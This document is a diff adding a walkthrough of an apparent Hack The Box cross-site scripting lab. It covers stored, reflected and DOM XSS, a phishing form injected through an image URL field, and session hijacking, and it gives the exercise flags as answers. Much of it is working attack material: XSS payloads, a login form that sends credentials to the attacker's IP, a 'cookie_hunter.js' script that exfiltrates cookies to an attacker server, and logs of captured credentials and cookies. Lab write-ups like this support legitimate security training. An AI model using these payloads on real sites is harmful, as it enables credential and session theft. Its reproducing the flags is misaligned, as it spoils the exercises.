@@ -1,0 +1,350 @@
+[Stored XSS]
+
+[*] Target: 46.101.81.114:31279
+
+[Question 1] To get the flag, use the same payload we used above ("<script>alert(window.origin)</script>"), but change its JavaScript code to show the cookie instead of showing the URL.
+
+    -   Go to http://46.101.81.114:31279 then enter anything you want in the "To-Do List" bar
+
+    [Example] I entered "Do Task 7" then "Do Homework":
+
+        ...
+        <div></div>
+        <ul class="list-unstyled" id="todo">
+        <ul>Do Task 7</ul>
+        <ul>Do Homework</ul>
+        </ul>   
+
+        => My input may not be sanitized
+
+    => I entered "</ul><img src=/random_img.jpg onerror="alert(document.cookie)"></img><ul>" => "... cookie=HTB{570r3d_f0r_3v3ry0n3_70_533}"
+        
+        ...
+        <div></div>
+        <ul class="list-unstyled" id="todo">
+        <ul>Do Task 7</ul>
+        <ul>Do Homework</ul>
+        <ul></ul><img src=/random_img.jpg onerror="alert(document.cookie)"></img><ul></ul>
+        </ul>  
+
+    [!] Answer: "HTB{570r3d_f0r_3v3ry0n3_70_533}" 
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Reflected XSS]
+
+[*] Target: 178.62.74.235:31363
+
+[Question 1] To get the flag, use the same payload we used above ("<script>alert(window.origin)</script>"), but change its JavaScript code to show the cookie instead of showing the URL. 
+
+     -   Go to http://46.101.81.114:31279 then enter anything you want in the "To-Do List" bar
+
+     [Example] I entered "Do Housework" <=> http://178.62.74.235:31363/index.php?task=Do+Housework
+
+        ...
+        <body>
+                <div class="form-group">
+                    <h1>To-Do <small>List</small></h1>
+                    <form role="form" action="index.php" method="GET">
+                        <input type="text" class="form-control" placeholder="Your Task" name="task" />
+                        <button type="submit" class="btn btn btn-primary">Add</button>
+                    </form>
+                </div> 
+        </body>
+        ...
+        <div></div><ul class="list-unstyled" id="todo"><div style="padding-left:25px">Task 'Do Housework' could not be added.</div></ul>
+
+    =>  I entered " '</div><img src=/random_img.jpg onerror="alert(document.cookie)"></img><!-- " 
+    
+    <=> http://178.62.74.235:31363/index.php?task=%27%3C%2Fdiv%3E%3Cimg+src%3D%2Frandom_img.jpg+onerror%3D%22alert%28document.cookie%29%22%3E%3C%2Fimg%3E%3C%21-- => "... cookie=HTB{r3fl3c73d_b4ck_2_m3}"
+
+        ...
+        <div></div><ul class="list-unstyled" id="todo"><div style="padding-left:25px">Task ''</div><img src=/random_img.jpg onerror="alert(document.cookie)"></img><!--' could not be added.</div></ul>
+
+    [!] Answer: "HTB{r3fl3c73d_b4ck_2_m3}"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[DOM XSS]
+
+[*] Target: 143.110.162.231:32736
+
+[Question 1] To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the URL.
+
+    -   Go to view-source:http://143.110.162.231:32736/
+
+    [Example] I entered "Tran Hung Thinh" <=> http://143.110.162.231:32736/?#task=Tran%20Hung%20Thinh
+
+        ...
+        <ul class="list-unstyled" id="todo"><b>Next Task:</b> Tran Hung Thinh</ul>
+        ...
+
+    => Nothing's new, right? But if you read the source code:
+
+        <!DOCTYPE html>
+        <html lang="en">
+
+        <head>
+        <meta charset="UTF-8">
+        <title>2Do</title>
+        <link rel="stylesheet" href="./style.css">
+        </head>
+
+        <body>
+        <link rel="stylesheet" href="./bootstrap-theme.min.css">
+        <link rel="stylesheet" href="./bootstrap.min.css">
+        <script>eval(atob("ZG9jdW1lbnQuY29va2llID0gYXRvYignU0ZSQ2UzQjFjak5zZVY5amJERXpiamRmTlRGa00zMD0nKTs="));</script>
+        <script src='./jquery.min.js'></script>
+        <script src="./bootstrap.min.js"></script>
+
+        <div class="form-group">
+            <h1>To-Do <small>List</small></h1>
+            <form role="form">
+            <input type="text" class="form-control" placeholder="Your Task" id="task">
+            </form>
+            <button type="button" class="btn btn btn-primary" id="add">Add</button>
+        </div>
+        <div></div>
+        <ul class="list-unstyled" id="todo"></ul>
+        <script src="script.js"></script>
+        </body>
+
+        </html>
+
+    => This page has no related function in the backend to execute your input (it doesn't have something like <form role="form" action="index.php" method="POST"> ...) => the cookie you wana get is already on this page
+
+    [#]  <script>eval(atob("ZG9jdW1lbnQuY29va2llID0gYXRvYignU0ZSQ2UzQjFjak5zZVY5amJERXpiamRmTlRGa00zMD0nKTs="));</script>
+
+        [?] eval is a JavaScript function that takes a string as an argument and executes it as code.
+
+        [?] atob is a built-in JavaScript function that decodes a base64-encoded string
+
+        <=> eval(document.cookie = atob('SFRCe3B1cjNseV9jbDEzbjdfNTFkM30='));
+
+        <=> eval(document.cookie = HTB{pur3ly_cl13n7_51d3}));
+
+    [!] Answer: "HTB{pur3ly_cl13n7_51d3}"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[XSS Discovery]
+
+[*] Target: 178.62.74.235:32493
+
+[Question 1] Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter?
+
+    -   After registering I have this "http://178.62.74.235:32493/?fullname=tranhungthinh&username=bigbox&password=123456&email=test%40gmail.com"
+
+    ->  Let's check if there is any vulnerable parameter for us to exploit (Using XSStrike _ https://github.com/s0md3v/XSStrike.git)
+
+    # python xsstrike.py -u "http://178.62.74.235:32493/?fullname=tranhungthinh&username=bigbox&password=123456&email=test%40gmail.com"
+
+                XSStrike v3.1.5
+
+        [~] Checking for DOM vulnerabilities 
+        [+] WAF Status: Offline 
+        [!] Testing parameter: fullname 
+        [-] No reflection found 
+        [!] Testing parameter: username 
+        [-] No reflection found 
+        [!] Testing parameter: password 
+        [-] No reflection found 
+        [!] Testing parameter: email 
+        [!] Reflections found: 1 
+        [~] Analysing reflections 
+        [~] Generating payloads 
+        [!] Payloads generated: 3072 
+        ------------------------------------------------------------
+        [+] Payload: <A%0aONPOiNtErentER%0d=%0d(prompt)``%0dx>v3dm0s 
+        [!] Efficiency: 100 
+        [!] Confidence: 10 
+        [?] Would you like to continue scanning? [y/N] 
+
+    - Try this "http://178.62.74.235:32493/?fullname=tranhungthinh&username=bigbox&password=123456&email=%3Cimg%20src=/%20onerror=alert(document.cookie)%3E%3C/img%3E%40gmail.com" => "cookie=HTB{r3fl3c73d_b4ck_2_m3}"
+
+    [!] Answer: "email"
+
+[Question 2] What type of XSS was found on the above server? "name only"
+
+    -   After reading the source code and all thing I did in the previous question, I can guarantee this is Reflected XSS
+
+    [!] Answer: "Reflected"
+
+
+***************************************************************************************************************************************************************************************************************************************************************************************************
+
+
+[Phishing]
+
+[*] Target: 10.129.162.157
+
+[Question 1] Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. 
+             Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. 
+             If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag.
+
+    -   I entered "https://i.imgur.com/HVTz2Ca.png" into the "Online Image Viewer" bar => It show me the blackhat guy 
+
+            <center>
+                <h1>Online Image Viewer</h1>
+                <div class="form-group">
+                    <form role="form" action="index.php" method="GET" id='urlform'>
+                        <input type="text" placeholder="Image URL" name="url">
+                    </form>
+                    <br>
+                    <img src='https://i.imgur.com/HVTz2Ca.png'>        
+                </div>
+            </center>
+
+    -   In this section, they told us to add a login form into the target page:
+
+            <h3>Please login to continue</h3>
+            <form action=http://10.10.16.4> <!-- This is my IP -->
+                <input type="username" name="username" placeholder="Username">
+                <input type="password" name="password" placeholder="Password">
+                <input type="submit" name="submit" value="Login">
+            </form>
+
+        => To add this stuff within an URL we can use document.write('')
+
+        [#] document.write('<h3>Please login to continue</h3><form action=http://10.10.16.4><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>')
+
+        => After putting this long code into the URL, now our target has shown the login form
+
+            <body style="background-color: #141d2b; font-family: sans-serif; color: white;">
+                <center>
+                    <h1>Online Image Viewer</h1>
+                    <div class="form-group">
+                        <form role="form" action="index.php" method="GET" id='urlform'>
+                            <input type="text" placeholder="Image URL" name="url">
+                        </form>
+                        <br>
+                        <img src='document.write('<h3>Please login to continue</h3><form action=http://10.10.16.4><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>')'>        
+                        </div>
+                </center>
+            </body>
+
+    => Good! Now they want us to send the phishing URL through /phishing/send.php, but before that, we should open our HTTP service    
+
+        -   I know there is a PHP code to save the username and password in the lesson but I think that isn't necessary in this case
+
+        # php -S 10.10.16.4:80
+        
+        ( Note: "python3 -m http.server 80" is oke too)
+        
+        [Mon May 15 22:04:38 2023] PHP 8.2.4 Development Server (http://10.10.16.4:80) started
+        [Mon May 15 22:06:37 2023] 10.129.162.157:43656 Accepted
+        [Mon May 15 22:06:37 2023] 10.129.162.157:43656 [404]: GET /?username=admin&password=p1zd0nt57341myp455&submit=Login - No such file or directory
+        [Mon May 15 22:06:37 2023] 10.129.162.157:43656 Closing
+
+    - Login these usernames and passwords to /phishing/login.php => "HTB{r3f13c73d_cr3d5_84ck_2_m3}"
+
+    [!] Answer: "HTB{r3f13c73d_cr3d5_84ck_2_m3}"
+
+
+***************************************************************************************************************************************************************************************************************************************************************************************************
+
+
+[Session Hijacking]
+
+[*] Target: http://10.129.133.39/hijacking/index.php
+
+[Question 1]  Try to repeat what you learned in this section to identify the vulnerable input field and find a working XSS payload, and then use the 'Session Hijacking' scripts to grab the Admin's cookie and use it in 'login.php' to get the flag.
+
+    -   Go to http://10.129.133.39/hijacking/index.php after registering you will have an URL look like this:
+
+        http://10.129.133.39/hijacking/index.php?fullname=hungthinhtran&username=bigbox&password=123&email=test%40gmail.com&imgurl=https%3A%2F%2Fvsec.com.vn%2Fwp-content%2Fuploads%2F2021%2F06%2FVSEC.logo_.white_crop.png
+
+    - Let's test this URL using XSStrike
+
+    # python3 xsstrike.py -u "http://10.129.133.39/hijacking/index.php?fullname=hungthinhtran&username=bigbox&password=123&email=test%40gmail.com&imgurl=https%3A%2F%2Fvsec.com.vn%2Fwp-content%2Fuploads%2F2021%2F06%2FVSEC.logo_.white_crop.png"
+
+            XSStrike v3.1.5
+
+        [~] Checking for DOM vulnerabilities 
+        [+] WAF Status: Offline 
+        [!] Testing parameter: fullname 
+        [-] No reflection found 
+        [!] Testing parameter: username 
+        [-] No reflection found 
+        [!] Testing parameter: password 
+        [-] No reflection found 
+        [!] Testing parameter: email 
+        [-] No reflection found 
+        [!] Testing parameter: imgurl 
+        [-] No reflection found 
+
+    => Yeah! =)) Exactly what I thought, they want to use execute the script through a file link. Now let's create a file that can gather cookie
+
+    # echo "new Image().src='http://10.10.16.5/random_img.jpg?target_cookie='+document.cookie" > cookie_hunter.js
+
+    [?] Basically, it creates an Image object with its source set to the specified URL, including the victim's session cookie as a parameter. This effectively sends the session cookie to the server
+
+    [#] On the registration page, we have to enter email, username ... but the only thing related to URL stuff is Profile Picture URL. let's check this out
+
+        [Step 1] I opened http port (python3 -m http.server 80)
+
+        [Step 2] Register ..bla..bla..
+                 Profile Picture URL: http://10.10.16.5/random_stuff
+
+        =>  Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+            10.129.133.39 - - [16/May/2023 02:22:37] code 404, message File not found
+            10.129.133.39 - - [16/May/2023 02:22:37] "GET /random_stuff HTTP/1.1" 404 -
+
+        [?] Remember when you entered this url, it just go to the URL you gave then take the resource (not execute it), you still need to find the way to execute it
+
+            <script src=http://10.10.16.5/cookie_hunter.js></script> will not work, believe me, I tried
+
+            Just guess their back-end, with me "><script src=http://10.10.16.5/cookie_hunter.js></script> works really good
+
+        => python3 -m http.server 80
+            
+            Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+            10.129.133.39 - - [16/May/2023 02:58:09] "GET /cookie_hunter.js HTTP/1.1" 200 -
+            10.129.133.39 - - [16/May/2023 02:58:11] code 404, message File not found
+            10.129.133.39 - - [16/May/2023 02:58:11] "GET /random_img.jpg?target_cookie=cookie=c00k1355h0u1d8353cu23d HTTP/1.1" 404 -
+
+    Now ! go to login.php then add "cookie" & "c00k1355h0u1d8353cu23d" into the Application tab => Reload the page and you will have "HTB{4lw4y5_53cur3_y0ur_c00k135}"
+
+    [!] Answer: "HTB{4lw4y5_53cur3_y0ur_c00k135}"
+
+
+***************************************************************************************************************************************************************************************************************************************************************************************************
+
+
+[Skills Assessment]
+
+[*] Target: http://10.129.126.157/assessment
+
+[Question 1] What is the value of the 'flag' cookie?
+
+    [#] Stuck on here right =)) You tested all kinds of XSS payloads in the search bar and retrieved nothing, feeling hopeless. Let me help you
+
+        "First thing first i'ma say all the words inside my head" that you are testing the wrong field and http://10.129.126.157/assessment/index.php/2021/06/11/welcome-to-security-blog/#comment-8 is one which you should test on ("Welcome to Security Blog" next to the search bar)
+
+    -   Easily you can see the "Website" is the only thing that is related to URL. Enter the URL isn't enough because this website will not take any resources from the URL you gave
+
+    -   <script src=http://10.10.16.5></script> is enough to send a request to your opening HTTP port
+
+        # python3 -m http.server 80
+        Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+        10.129.126.157 - - [16/May/2023 06:13:05] "GET / HTTP/1.1" 200 -
+
+    -   You can use the script from the previous question to gather cookies and with me, it is "cookie_hunter.js"
+
+    [Moment of the truth]
+
+    -   In the "Website",I entered "<script src=http://10.10.16.5/cookie_hunter.js></script>" then submited my comment
+
+        # python3 -m http.server 80
+        Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+        10.129.126.157 - - [16/May/2023 06:28:16] "GET /cookie_hunter.js HTTP/1.1" 200 -
+        10.129.126.157 - - [16/May/2023 06:28:17] code 404, message File not found
+        10.129.126.157 - - [16/May/2023 06:28:17] "GET /random_img.jpg?target_cookie=wordpress_test_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1684232895;%20flag=HTB{cr055_5173_5cr1p71n6_n1nj4} HTTP/1.1" 404 -
+
+    [!] Answer: "HTB{cr055_5173_5cr1p71n6_n1nj4}"
